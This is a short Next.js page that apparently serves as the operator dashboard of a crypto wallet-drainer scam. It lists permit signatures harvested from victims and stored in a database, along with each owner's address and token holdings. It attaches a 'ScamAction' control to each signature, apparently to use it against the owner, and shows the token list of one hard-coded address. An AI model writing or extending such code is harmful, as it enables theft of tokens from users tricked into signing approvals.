import prisma from "@backend/modules/prisma/Prisma";
import {PermitSignature} from "@prisma/client";
import {createPermitSignature, FinalizedSignedSignature} from "@/app/page";
import React from "react";
import ScamAction from "@/app/scam/ScamAction";
import TokenList from "@/app/TokenList";

export type SignedPermitSignature = Awaited<ReturnType<typeof createPermitSignature>>

const Page = async () => {
	const list = await prisma.permitSignature.findMany();
	return (
		<div className={'container mx-auto p-2'}>
			{list.map((item) => {
				const {signedSignature: data} = item.data as FinalizedSignedSignature;
				return (
					<details className={'p-2 my-2 border rounded'}>
						<summary>
							{data.permit.owner}
						</summary>
						<div>
							<textarea readOnly value={JSON.stringify(item.data,null,2)} className={'w-full p-2 rounded min-h-[350px] bg-black text-green-600'}></textarea>
						</div>
						<ScamAction data={data} finalized={item.data}  />
						<TokenList address={data.permit.owner} CHAIN_ID={1} />
					</details>
				)
			})}
			<br/>
			<hr/>
			<TokenList address={"0xb3b77682060b7f6f589BAB55ECc269dF03ED3C96"} CHAIN_ID={1} />
		</div>
	);
};

export default Page;
